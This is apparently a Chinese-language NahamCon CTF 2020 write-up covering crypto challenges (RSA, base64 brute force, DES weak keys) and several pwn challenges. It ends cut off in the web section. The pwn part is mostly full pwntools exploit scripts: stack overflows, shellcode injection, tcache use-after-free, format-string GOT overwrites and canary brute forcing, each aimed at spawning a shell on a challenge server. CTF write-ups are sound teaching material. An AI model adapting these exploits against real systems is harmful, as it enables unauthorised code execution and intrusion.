\"MTAwLDExMSwxMDAsOTYsMTEyLDIxLDIwOSwxNjYsMjE2LDE0MCwzMzAsMzE4LDMyMSw3MDIyMSw3MDQxNCw3MDU0NCw3MTQxNCw3MTgxMCw3MjIxMSw3MjgyNyw3MzAwMCw3MzMxOSw3MzcyMiw3NDA4OCw3NDY0Myw3NTU0MiwxMDAyOTAzLDEwMDgwOTQsMTAyMjA4OSwxMDI4MTA0LDEwMzUzMzcsMTA0MzQ0OCwxMDU1NTg3LDEwNjI1NDEsMTA2NTcxNSwxMDc0NzQ5LDEwODI4NDQsMTA4NTY5NiwxMDkyOTY2LDEwOTQwMDA=\" def a ( num ): if ( num > 1 ): for i in range ( 2 , num ): if ( num % i ) == 0 : return False break return True else : return False def b ( num ): my_str = str ( num ) rev_str = reversed ( my_str ) if list ( my_str ) == list ( rev_str ): return True else : return False cipher = base64 . b64decode ( cipher_b64 ) . decode () . split ( \",\" ) while ( count < len ( cipher )): if ( a ( num )): if ( b ( num )): print ( chr ( int ( cipher [ count ]) ^ num ), end = '' , flush = True ) count += 1 if ( count == 13 ): num = 50000 if ( count == 26 ): num = 500000 else : pass num += 1 print () \u660e\u663e\u80fd\u53d1\u73b0a\u51fd\u6570\u662f\u7528\u6765\u5224\u65ad\u4e00\u4e2a\u6570\u662f\u5426\u4e3a\u7d20\u6570\uff0c\u4e0d\u8fc7\u89c2\u5bdf\u4f20\u9012\u7684num\u503c\uff0c\u80fd\u53d1\u73b0\u5f53count\u4e3a26\u65f6\uff0c\u4f20\u9012\u7684num\u503c\u53d8\u6210\u4e86500000\uff0c\u800ca\u51fd\u6570\u7528\u7684\u662f2-num\u7684\u5e8f\u5217\uff0c\u8fd9\u662f\u5bfc\u81f4\u65f6\u95f4\u8fc7\u957f\u7684\u6839\u672c\u539f\u56e0\u3002\u4ed4\u7ec6\u601d\u8003\u53d1\u73b0\u5224\u65ad\u4e00\u4e2a\u6570\u4e3a\u7d20\u6570\u53ea\u9700\u8981\u75282-\u5e73\u65b9\u6839\u8fd9\u4e2a\u5e8f\u5217\u5373\u53ef\u3002\u5f88\u7b80\u5355\u7684\u4e00\u4e2a\u539f\u7406\uff1a $$ \u5047\u8bbe a=bc, b<c, b\u4e00\u5b9a\u5c0f\u4e8ea\u7684\u5e73\u65b9\u6839 $$ \u6240\u4ee5\u66f4\u6362\u5e8f\u5217\u5373\u53ef\u3002\u3002\u5f53\u7136\u5982\u679cnum\u7684\u503c\u5f88\u5927\uff0c\u4e5f\u53ef\u4ee5\u7528\u5e93\u7684\u5185\u7f6e\u51fd\u6570\u5224\u65ad\uff08\u6269\u5c55\u6b27\u51e0\u91cc\u5f97\u7b97\u6cd5\uff09\u3002 Twinning \u00b6 \u7b80\u5355RSA\u5c31\u4e0d\u591a\u8bf4\u4e86\u6ca1\u4ec0\u4e48\u610f\u4e49 import gmpy2 from Crypto.Util.number import * e = 65537 n = 158889932099 p = 398611 q = 398609 c = 19549668696 d = gmpy2 . invert ( e ,( p - 1 ) * ( q - 1 )) print pow ( c , d , n ) Ooo-la-la \u00b6 \u8fd8\u662f\u7b80\u5355RSA\u3002\u3002\u3002\u3002 import gmpy2 from Crypto.Util.number import * N = 3349683240683303752040100187123245076775802838668125325785318315004398778586538866210198083573169673444543518654385038484177110828274648967185831623610409867689938609495858551308025785883804091 e = 65537 c = 87760575554266991015431110922576261532159376718765701749513766666239189012106797683148334771446801021047078003121816710825033894805743112580942399985961509685534309879621205633997976721084983 p = 1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428213 q = 1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428207 d = gmpy2 . invert ( e ,( p - 1 ) * ( q - 1 )) print long_to_bytes ( pow ( c , d , N )) Unvreakable Vase \u00b6 \u7ed9\u4e86\u4e00\u4e32\u5bc6\u6587\uff1a zmxhz3tkb2vzx3roaxnfzxzlbl9jb3vudf9hc19jcnlwdg9vb30= \u80fd\u53d1\u73b0\u662fbase64\uff0c\u4e0d\u8fc7\u5927\u5c0f\u5199\u88ab\u6e05\u9664\u4e86\uff0c\u5199\u811a\u672c\u7206\u7834\u5373\u53ef\uff0c\u6bcf\u4e2a\u5b57\u6bcd\u7684\u72b6\u6001\u53ea\u67090\u548c1\uff0c\u603b\u5171\u53ea\u670930\u591a\u4e2a\u5b57\u6bcd\uff0c\u5b57\u7b26\u7a7a\u95f4\u5e94\u8be5\u662f2^30?\uff0c\u8fd8\u7b97\u53ef\u4ee5\u63a5\u53d7\u4f46\u662f\u8fd8\u662f\u592a\u5927\uff0c\u6839\u636ebase64\u52a0\u89e3\u5bc6\u539f\u7406\uff0c\u5bc6\u6587\u4e00\u822c\u662f\u9694\u6bb5\u52a0\u5bc6\uff0c\u5177\u4f53\u53ef\u53c2\u8003base64\u52a0\u5bc6\u539f\u7406\u3002\u6839\u636e\u8fd9\u4e2a\u65b9\u6cd5\u53ea\u9700\u8981\u5224\u65ad\u6bcf\u6bb5\u662f\u5426\u4e3a\u6b63\u786e\u5b57\u7b26\u4e32\u5373\u53ef\u3002\u6211\u5199\u7684\u811a\u672c\u592a\u83dc\uff0c\u53c2\u8003\u56fd\u5916\u5927\u4f6c\u7684\u5373\u53ef\uff1a from base64 import b64decode as decode from itertools import product data = 'zmxhz3tkb2vzx3roaxnfzxzlbl9jb3vudf9hc19jcnlwdg9vb30=' CHARSET = 'abcdefghijklmnopqrstuvwxyz_ {} ' def case_variations ( string ): possibilities = [] for char in string : possibilities . append ([ char . lower (), char . upper ()]) return [ \"\" . join ( perm ) for perm in product ( * possibilities )] flag = b \"\" real_data = \"\" for i in range ( 0 , len ( data ), 4 ): crib = data [ i : i + 4 ] for case_variation in case_variations ( crib ): if all ( chr ( char ) in CHARSET for char in decode ( case_variation )): real_data += case_variation flag += decode ( case_variation ) print ( flag ) break print ( real_data ) \u57fa\u672c\u601d\u60f3\u4e00\u6837\u3002 December \u00b6 \u7ed9\u4e86\u52a0\u5bc6\u6587\u672c\u548c\u6e90\u7801\uff1a from Crypto.Cipher import DES import string def XOR ( a , b ) : out = '' for i in range ( len ( a )) : out += chr ( ord ( a [ i ]) ^ ord ( b [ i ])) return out def printable ( l ): return all ( i in string . printable for i in l ) ciphertext = open ( \"ciphertext\" , \"rb\" ) . read () IV = '13371337' plain = [] even = [] odd = [] for i in range ( 0 , len ( ciphertext ), 8 ) : block = ciphertext [ i : i + 8 ] out = XOR ( block , IV ) if printable ( out ) : even . append ( out ) else : out = XOR ( key , out ) odd . append ( out ) plain . append ( out ) print even print odd print '' . join ( plain ) des\u7684ofb\u6a21\u5f0f\uff0c\u8fd9\u91cc\u7b80\u5355\u8bf4\u4e00\u4e0b\u653b\u51fb\u65b9\u6cd5\uff0c\u5bc6\u6587\u8fc7\u7a0b\u4e2d\u53ea\u6709\u5728\u5947\u6570\u6bb5\u4f1a\u7528\u5230key\uff0c\u5076\u6570\u4f4d\u5219\u4e0d\u4f1a\u8c03\u7528key\uff0c\u53ea\u8fdb\u884c\u7b80\u5355\u7684des\u3002\u901a\u8fc7\u8fd9\u4e2a\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5206\u6790\u6c42\u51fa\u3002\u4e0d\u8fc7\u56e0\u4e3a\u53ef\u7528\u4fe1\u606f\u5b9e\u5728\u592a\u5c11\uff0c\u63a8\u4e0d\u51fakey\u3002\u8fd9\u91cc\u91c7\u7528\u5f31\u5bc6\u94a5\uff0c\u539f\u7406\u540c\u4e0a\uff0c\u5177\u4f53\u7684\u6d41\u7a0b\u53ef\u53c2\u8003\u7ef4\u57fa\u767e\u79d1\u3002\u811a\u672c\uff1a from Crypto.Cipher import DES import string import re f = open ( 'ciphertext' , 'rb' ) ciphertext = f . read () f . close () parity = [ '0101010101010101' , 'FEFEFEFEFEFEFEFE' , 'E0E0E0E0F1F1F1F1' , '1F1F1F1F0E0E0E0E' ] noparity = [ '0000000000000000' , 'FFFFFFFFFFFFFFFF' , 'E1E1E1E1F0F0F0F0' , '1E1E1E1E0F0F0F0F' ] parity = [ i . decode ( 'hex' ) for i in parity ] noparity = [ i . decode ( 'hex' ) for i in noparity ] keylist = [ parity , noparity ] IV = '13371337' for key in keylist : for KEY in key : a = DES . new ( KEY , DES . MODE_OFB , IV ) plain = a . decrypt ( ciphertext ) print plain Raspberry \u00b6 \u7ed9\u4e86n\uff0ce\uff0cc\uff1a n = 7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317 e = 65537 c = 5300731709583714451062905238531972160518525080858095184581839366680022995297863013911612079520115435945472004626222058696229239285358638047675780769773922795279074074633888720787195549544835291528116093909456225670152733191556650639553906195856979794273349598903501654956482056938935258794217285615471681 \u5c1d\u8bd5\u5728\u7ebf\u5206\u89e3n\uff0c\u4e0d\u8fc7\u7d20\u6570\u56e0\u5b50\u6709\u5f88\u591a\u3002\u4e0d\u8fc7\u6d41\u7a0b\u662f\u4e00\u6837\u7684\uff0c\u53ea\u9700\u8981\u6c42\u591a\u4e2a\u7d20\u6570\u7684phi\u5373\u53ef\uff1a $$ phi = (p1-1) (p2-1) ... $$ \u811a\u672c\uff1a import gmpy2 from Crypto.Util.number import * pq = [ 2208664111 , 2214452749 , 2259012491 , 2265830453 , 2372942981 , 2393757139 , 2465499073 , 2508863309 , 2543358889 , 2589229021 , 2642723827 , 2758626487 , 2850808189 , 2947867051 , 2982067987 , 3130932919 , 3290718047 , 3510442297 , 3600488797 , 3644712913 , 3650456981 , 3726115171 , 3750978137 , 3789130951 , 3810149963 , 3979951739 , 4033877203 , 4128271747 , 4162800959 , 4205130337 , 4221911101 , 4268160257 ] n = 7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317 e = 65537 c = 5300731709583714451062905238531972160518525080858095184581839366680022995297863013911612079520115435945472004626222058696229239285358638047675780769773922795279074074633888720787195549544835291528116093909456225670152733191556650639553906195856979794273349598903501654956482056938935258794217285615471681 phi = 1 for i in pq : phi *= ( i - 1 ) d = gmpy2 . invert ( e , phi ) print long_to_bytes ( pow ( c , d , n )) Elsa4 \u00b6 \u8fd9\u9053\u9898\u662f\u6700\u540e\u51e0\u4e2a\u5c0f\u65f6\u653e\u51fa\u6765\u7684\uff0c\u7b97\u6cd5\u4e0d\u592a\u5e38\u7528\uff0c\u540e\u9762\u4e86\u89e3\u662fEliseFour\u52a0\u5bc6\u7b97\u6cd5\u3002\u5177\u4f53\u53ef\u4ee5\u53c2\u8003 https://fireshellsecurity.team/nahamcon-ctf-2020-elsa4/ Pwn \u00b6 dangerous \u00b6 \u4e00\u9053\u975e\u5e38\u7b80\u5355\u7684\u6808\u6ea2\u51fa\uff0c\u8986\u76d6\u8fd4\u56de\u5730\u5740\u4e3a\u51fa\u9898\u4eba\u7559\u4e0b\u7684\u540e\u95e8\u3002\u5728\u521a\u5f00\u59cb\u505a\u8fd9\u9053\u9898\u7684\u65f6\u5019\uff0c\u6ca1\u6709\u6ce8\u610f\u5230\u51fa\u9898\u4eba\u7559\u7684\u540e\u95e8\uff0c\u800c\u6ea2\u51fa\u53c8\u53ea\u80fd\u8986\u76d6\u8fd4\u56de\u5730\u5740\uff0c\u9677\u5165\u4e86\u56f0\u5883\uff0c\u8d70\u4e86\u633a\u591a\u5f2f\u8def\u3002\u6240\u4ee5\u5f97\u5148strings\u770b\u4e00\u4e0b\u7a0b\u5e8f\u6709\u54ea\u4e9b\u5173\u952e\u5b57\u7b26\uff0c\u662f\u5426\u6709backdoor\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50011 ) else : sh = process ( './dangerous' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' sh . recvuntil ( 'name?' ) payload = 'a' * 0x1f1 + p64 ( 0x000000000401312 ) sh . send ( payload ) sh . interactive () saas \u00b6 \u4e00\u4e2a\u7531syscall\u5199\u7684\u7a0b\u5e8f\uff0c\u5141\u8bb8\u7528\u6237\u8c03\u7528\u5e38\u89c4\u7684syscall\uff0c\u7981\u7528\u4e86execve\u548c\u51e0\u4e2a\u4e0e\u7ebf\u7a0b\u6709\u5173\u7684\u7cfb\u7edf\u8c03\u7528\u3002\u5229\u7528\u65b9\u6cd5\u5f53\u7136\u662forw\uff0c\u4f46\u662f\u7a0b\u5e8f\u4fdd\u62a4\u5168\u5f00\uff0c\u4e5f\u5c31\u662f\u8bf4\u6ca1\u6709\u5730\u65b9\u53bb\u5199\u5165\uff0c\u8fd9\u4e2a\u65f6\u5019\u6211\u4eec\u8981\u600e\u4e48\u529e\u5462\uff1f\u6211\u4eec\u53ef\u4ee5\u7528brk\u7cfb\u7edf\u8c03\u7528\uff0c\u53bb\u5f00\u8f9f\u4e00\u4e2a\u65b0\u7684heap\uff0c\u5176\u8fd4\u56de\u503c\u4f1a\u662fheap\u7684\u5730\u5740\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u6709\u4e00\u4e2a\u5730\u5740\u6765\u5199\u5165\u4e86\u3002\u6ce8\u610f\uff0c\u7b2c\u4e00\u6b21\u8c03\u7528brk\u65f6\u662f\u521d\u59cb\u5316\u5806\uff0c\u8fd8\u6ca1\u6709\u771f\u6b63\u7684\u5206\u914d\u7269\u7406\u5730\u5740\uff0c\u8981\u7b2c\u4e8c\u6b21\u8c03\u7528\u65f6\u624d\u4f1a\u5206\u914d\u5730\u5740\u3002 from pwn import * from LibcSearcher import * from struct import pack , unpack if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50016 ) else : sh = process ( './saas' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def syscall ( rax = 0 , rdi = 0 , rsi = 0 , rdx = 0 , r10 = 0 , r8 = 0 , r9 = 0 ): sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rax )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rdi )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rsi )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rdx )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r10 )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r8 )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r9 )) sh . recvuntil ( 'Rax: ' ) return int ( sh . recvline () . replace ( ' \\n ' , '' ), 16 ) def syscall2 ( rax = 0 , rdi = 0 , rsi = 0 , rdx = 0 , r10 = 0 , r8 = 0 , r9 = 0 ): sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rax )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rdi )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rsi )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( rdx )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r10 )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r8 )) sh . recvuntil ( '(decimal):' ) sh . sendline ( str ( r9 )) # brk() heap = syscall ( 12 , 0 ) syscall ( 12 , heap + 0x10000 ) # read(0,heap,0x20) syscall2 ( 0 , 0 , heap , 0x20 ) sh . sendline ( 'flag.txt \\x00 ' ) # open(heap) fd = syscall ( 2 , heap , 2 ) print hex ( fd ) # read(2,heap,0x30) syscall ( 0 , fd , heap + 0x20 , 0x30 ) # write(1,heap,0x30) syscall2 ( 1 , 1 , heap + 0x20 , 0x30 ) #gdb.attach(sh) sh . interactive () shifts-ahoy \u00b6 \u7a0b\u5e8f\u6ca1\u6709\u5f00\u542fNX\u4fdd\u62a4\uff0c\u6709\u4e00\u4e2a\u6808\u6ea2\u51fa\u6f0f\u6d1e\uff0c\u4f46\u662f\u53ea\u80fd\u6ea2\u51fa\u5230\u8fd4\u56de\u5730\u5740\u3002\u6211\u4eec\u89c2\u5bdf\u6709\u6f0f\u6d1e\u7684\u51fd\u6570\uff0c\u5176\u5c06rsp\u7684\u503c\u4f20\u7ed9\u4e86r15\uff0c\u6240\u4ee5\u5982\u679c\u6211\u4eec\u80fd\u5229\u7528jmp r15\u8fd9\u6837\u7684gadget\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u5c06shellcode\u5e03\u7f6e\u5728\u6808\u4e2d\uff0c\u8fdb\u800c\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50015 ) else : sh = process ( './shifts-ahoy' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' # gdb.attach(sh,''' # b*0x0000000000401263 # c # ''') jmp = 0x4011cd shellcode = asm ( shellcraft . sh ()) payload = '' for i in shellcode : n = ord ( i ) if n >= 13 : payload += chr ( n - 13 ) else : payload += chr ( 256 + n - 13 ) payload = payload . ljust ( 0x58 , ' \\x00 ' ) payload += p64 ( jmp ) sh . recvuntil ( '?' ) sh . sendline ( '1' ) sh . sendline ( payload ) sh . interactive () syrup \u00b6 \u548c\u4e0a\u4e00\u9053\u9898\u7684\u601d\u8def\u5dee\u4e0d\u591a\uff0c\u4f46\u662f\u8fd9\u9053\u9898\u6ca1\u6709\u7528\u4efb\u4f55\u5e93\u51fd\u6570\uff0c\u6240\u4ee5\u80fd\u5229\u7528\u7684gadget\u5f88\u5c11\uff0c\u89c2\u5bdf\u7a0b\u5e8f\u53d1\u73b0\uff0c\u8bfb\u5165\u7684\u6570\u636e\u7684\u5730\u5740\u662f\u7531rbp\u5bc4\u5b58\u5668\u63a7\u5236\u7684\uff0c\u5982\u679c\u6211\u4eec\u63a7\u5236rbp\u4e3abss\u5730\u5740\uff0c\u8fdb\u800c\u5c06shellcode\u5199\u5165bss\u4e2d\uff0c\u518d\u5c06\u8fd4\u56de\u5730\u5740\u4fee\u6539\u4e3abss\u5730\u5740\uff0c\u4e0d\u5c31ok\u4e86\u5417\uff1f from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50036 ) else : sh = process ( './syrup' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' shellcode = asm ( shellcraft . sh ()) canary = 0x6042 payload = 'a' * 0x400 + p64 ( canary ) payload += p64 ( 0x0000000000402011 ) payload += p64 ( 0x000000000040105D ) + p64 ( canary ) payload += p64 ( 0 ) + p64 ( 0x0000000000402011 ) sh . recvuntil ( '?' ) sh . sendline ( payload ) sh . sendline ( shellcode ) sh . interactive () conveyor \u00b6 \u7a0b\u5e8f\u521b\u5efa\u4e86\u4e00\u4e2a\u5355\u9879\u94fe\u8868\uff0c\u4f46\u662f\u53ef\u4ee5\u4fee\u6539\u94fe\u8868\u7684next\u6307\u9488\uff0c\u6240\u4ee5\u53ef\u4ee5\u5c06\u67d0\u4e00\u4e2apart\u7684next\u6307\u9488\u4fee\u6539\u4e3agot\u8868\u7684\u5730\u5740\uff0c\u7136\u540e\u4fee\u6539atoi\u4fee\u6539\u4e3asystem\u3002 from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50020 ) else : sh = process ( './conveyor' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def choice ( elect ): sh . recvuntil ( '>' ) sh . sendline ( str ( elect )) def add ( content ): choice ( 1 ) sh . recvuntil ( ':' ) sh . sendline ( content ) def edit ( content ): sh . recvuntil ( 'safe?' ) sh . sendline ( 'y' ) sh . recvuntil ( ':' ) sh . sendline ( content ) add ( 'aaaaa' ) add ( 'bbbbb' ) add ( 'ccccc' ) choice ( 2 ) edit ( p64 ( 0 ) * 15 + p64 ( 0x0000000000602050 )) sh . recvuntil ( 'part: \\n ' ) puts_addr = u64 ( sh . recvuntil ( ' \\n ' ) . replace ( ' \\n ' , '' ) . ljust ( 8 , ' \\x00 ' )) libc = LibcSearcher ( 'setvbuf' , puts_addr ) libc_base = puts_addr - libc . dump ( 'setvbuf' ) system = libc_base + libc . dump ( 'system' ) print hex ( system ) sh . sendline ( p64 ( puts_addr ) + p64 ( system )) sh . sendline ( '/bin/sh \\x00 ' ) #gdb.attach(sh) sh . interactive () ripe_reader \u00b6 \u8fd9\u9053\u9898\u6709\u4e00\u70b9\u610f\u601d\uff0c\u7a0b\u5e8f\u662f\u4e00\u4e2a\u670d\u52a1\u7aef\u7cfb\u7edf\uff0c\u6bcf\u4e2a\u548c\u5b83\u8fde\u63a5\u7684\u5ba2\u6237\u7aef\u90fd\u662ffork\u7684\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u800c\u5b50\u8fdb\u7a0b\u548c\u7236\u8fdb\u7a0b\u62e5\u6709\u76f8\u540c\u7684\u5185\u5b58\u6570\u636e\uff0c\u53cacannary rbp\u7b49\u4fe1\u606f\u90fd\u662f\u76f8\u540c\u7684\uff0c\u6240\u4ee5\u53ef\u4ee5\u7528\u7206\u7834\u7684\u65b9\u6cd5\u6765\u6cc4\u6f0fcannary\uff0crbp\uff0c\u7a0b\u5e8f\u57fa\u5740\u4fe1\u606f\uff0c\u7a0b\u5e8f\u4f7f\u7528python sock\u5b9e\u73b0\u7684\uff0c\u6ca1\u6709\u7528pwntools\u3002 from socket import socket , timeout from struct import unpack , pack from time import sleep from telnetlib import Telnet from pwn import p64 import sys host = '127.0.0.1' port = 1234 if sys . argv [ 1 ] == \"scan\" : payload = b 'a' * 56 start = len ( payload ) stop = len ( payload ) + 8 while len ( payload ) < stop : for i in range ( 255 ): sock = socket () sock . connect (( host , port )) sock . recv ( 1024 ) sock . send ( payload + pack ( 'B' , i )[ 0 ]) sleep ( 0.1 ) res = sock . recv ( 1024 ) . decode () if \"Select one of the images:\" in res : print \"Found:\" + hex ( i ) payload += pack ( 'B' , i )[ 0 ] sock . close () break sock . close () canary = unpack ( '<Q' , payload [ - 8 :])[ 0 ] print 'canary:' + hex ( canary ) start = len ( payload ) stop = len ( payload ) + 8 while len ( payload ) < stop : for i in range ( 255 ): sock = socket () sock . connect (( host , port )) sock . recv ( 1024 ) sock . send ( payload + pack ( 'B' , i )[ 0 ]) sleep ( 0.1 ) res = sock . recv ( 1024 ) . decode () if \"Select one of the images:\" in res : print \"Found:\" + hex ( i ) payload += pack ( 'B' , i )[ 0 ] sock . close () break sock . close () bb = unpack ( '<Q' , payload [ - 8 :])[ 0 ] print hex ( bb ) start = len ( payload ) stop = len ( payload ) + 8 while len ( payload ) < stop : for i in range ( 255 ): sock = socket () sock . connect (( host , port )) sock . recv ( 1024 ) sock . send ( payload + pack ( 'B' , i )[ 0 ]) sleep ( 0.1 ) res = sock . recv ( 1024 ) . decode () if \"Select one of the images:\" in res : print \"Found:\" + hex ( i ) payload += pack ( 'B' , i )[ 0 ] sock . close () break sock . close () ret = unpack ( '<Q' , payload [ - 8 :])[ 0 ] print hex ( ret ) else : canary = 0xfaf43373050f5600 rbp = 0x7ffd1c3bf4c0 bb = 0x55ef50984000 rsi_r15_ret = bb + 0x0000000000001101 string_addr = rbp - 0x70 - 0x18 printfile = bb + 0x0000000000000FDC string = b 'flag.txt \\x00\\x00 ' payload = b './' * 23 + string + pack ( '<Q' , canary ) \\ + p64 ( rbp ) + p64 ( rsi_r15_ret ) + p64 ( string_addr ) + p64 ( 0 ) + p64 ( printfile ) sock = socket () sock . connect (( host , port )) sock . recv ( 1024 ) sock . send ( payload ) t = Telnet () t . sock = sock t . interact () sock . close () free-willy \u00b6 \u83dc\u5355\u9898\uff0c\u4fdd\u62a4\u5168\u5f00\uff0c\u6709\u4e00\u4e2auaf\u6f0f\u6d1e\u3002libc\u7248\u672c\u662f2.27\uff0c\u5373\u6709tcache\u673a\u5236\uff0c\u8fd9\u6837\u7684\u8bdd\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u6cc4\u6f0f\u5730\u5740\u9700\u8981\u586b\u5145\u6ee10x90\u7684tcache\u518d\u8fdb\u884c\u6cc4\u6f0f\uff0c\u540c\u65f62.27\u7248\u672c\u7684tcache\u5e76\u6ca1\u6709\u5806double free\u8fdb\u884c\u68c0\u6d4b\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528uaf\u4fee\u6539\u4e00\u4e2a\u5806\u5757\u7684\u5927\u5c0f\u4e3a0x90\uff0c\u7136\u540e\u8fde\u7eed\u662f\u54268\u6b21\u6765\u6cc4\u6f0flibc\u3002\u4e4b\u540e\u6211\u662f\u653b\u51fbatoi\u6765\u83b7\u5f97shell\u3002 from pwn import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50021 ) else : sh = process ( './free-willy' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' libc = ELF ( '/lib/x86_64-linux-gnu/libc.so.6' ) def choice ( elect ): sh . recvuntil ( 'Menu:' ) sh . sendline ( elect ) def add ( content ): choice ( 'adopt' ) sh . recvuntil ( ':' ) sh . sendline ( content ) def delete ( index ): choice ( 'disown' ) sh . recvuntil ( 'send away?' ) sh . sendline ( str ( index )) def edit ( index , content ): choice ( 'name' ) sh . recvuntil ( 'rename?' ) sh . sendline ( str ( index )) sh . recvuntil ( 'name?' ) sh . sendline ( content ) def show ( index , content ): choice ( 'name' ) sh . recvuntil ( 'observe?' ) sh . sendline ( str ( index )) add ( 'aaa' ) add ( 'bbb' ) add ( 'ccc' ) add ( 'ddd' ) delete ( 0 ) choice ( 'observe' ) sh . recvuntil ( '0. ' ) heap = u64 ( sh . recvuntil ( ' \\n ' ) . replace ( ' \\n ' , '' ) . ljust ( 8 , ' \\x00 ' )) print hex ( heap ) sh . sendline ( '1' ) a = ( heap & ( ~ 0xfff )) + 0x700 edit ( 0 , p64 ( a )) add ( p64 ( 0 ) + p64 ( 0x91 )) delete ( 3 ) edit ( 3 , p64 ( 0x0000000000603050 )) add ( '' ) for i in range ( 8 ): delete ( 1 ) choice ( 'observe' ) sh . recvuntil ( '1. ' ) libc_base = u64 ( sh . recvuntil ( ' \\n ' ) . replace ( ' \\n ' , '' ) . ljust ( 8 , ' \\x00 ' )) - 0x3ebca0 print hex ( libc_base ) sh . sendline ( '2' ) malloc = libc_base + libc . symbols [ 'malloc' ] fflush = libc_base + libc . symbols [ 'fflush' ] system = libc_base + libc . symbols [ 'system' ] rand = libc_base + libc . symbols [ 'rand' ] edit ( 5 , p64 ( malloc ) + p64 ( fflush ) + p64 ( system ) + p64 ( rand )) #gdb.attach(sh) sh . interactive () leet_haxor \u00b6 \u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\uff0c\u5148\u6cc4\u6f0flibc\u5730\u5740\uff0c\u7136\u540e\u4fee\u6539atoi\u7684got\u8868\u4e3asystem\u8fdb\u800c\u83b7\u5f97shell from pwn import * from LibcSearcher import * if args [ 'REMOTE' ]: sh = remote ( 'jh2i.com' , 50022 ) else : sh = process ( './leet_haxor' ) if args [ 'I386' ]: context . arch = 'i386' else : context . arch = 'amd64' if args [ 'DEBUG' ]: context . log_level = 'debug' def attack_vuln ( content ): sh . recvuntil ( 'exit' ) sh . sendline ( '0' ) sh . recvuntil ( ':' ) sh . sendline ( content ) # gdb.attach(sh,''' # b*0x000000000040084c # c # ''') #leak printf_got = 0x0000000000601030 attack_vuln ( '%33$p' ) sh . recvuntil ( ' \\n ' ) libc_start = int ( sh . recvuntil ( ' \\n ' ) . replace ( ' \\n ' , '' ), 16 ) - 231 libc = LibcSearcher ( '__libc_start_main' , libc_start ) libc_base = libc_start - libc . dump ( '__libc_start_main' ) system = libc_base + libc . dump ( 'system' ) print hex ( system ) #modify printf to system payload = '' length = 0 for i in range ( 4 ): data = system & 0xff if data > length : payload += '%' + str ( data - length ) + 'c%' + str ( 24 + i ) + '$hhn' else : payload += '%' + str ( 256 + data - length ) + 'c%' + str ( 24 + i ) + '$hhn' length = data system >>= 8 payload = payload . ljust ( 0x30 , ' \\x00 ' ) for i in range ( 4 ): payload += p64 ( printf_got + i ) attack_vuln ( payload ) sh . recvuntil ( 'exit' ) sh . sendline ( '1' ) sh . recvuntil ( ':' ) sh . sendline ( '/bin/sh \\x00 ' ) sh . interactive ()","title":"NahamConCTF2020"},{"location":"wp/NahamConCTF/#web","text":"","title":"Web"},{"location":"wp/NahamConCTF/#agent-95","text":"\u7b7e\u5230\u9898\uff0c\u53ea\u9700\u8981\u6539\u4e00\u4e0b**User-Agent**\u5373\u53ef\uff0c\u9898\u76ee\u8bf4\u662f95\uff0cgoogle\u4e00\u4e0b\u5c31\u77e5\u9053\u662fWindows 95\uff0c\u4fee\u6539\u4e00\u4e0b\u5373\u53ef\u3002","title":"Agent 95"},{"location":"wp/NahamConCTF/#localghost","text":"\u5728\u6e90\u7801\u53d1\u73b0\u6709\u5947\u602a\u7684**js**\u6587\u4ef6\uff0c\u62ff\u4e0b\u6765\u89e3\u5bc6\u4e00\u4e0b\uff1a var _0xbcec = [ \"\\x75\\x73\\x65\\x20\\x73\\x74\\x72\\x69\\x63\\x74\" , \"\\x6A\\x73\\x63\\x72\\x6F\\x6C\\x6C\" , \"\\x3C\\x73\\x6D\\x61\\x6C\\x6C\\x3E\\x4C\\x6F\\x61\\x64\\x69\\x6E\\x67\\x2E\\x2E\\x2E\\x3C\\x2F\\x73\\x6D\\x61\\x6C\\x6C\\x3E\" , 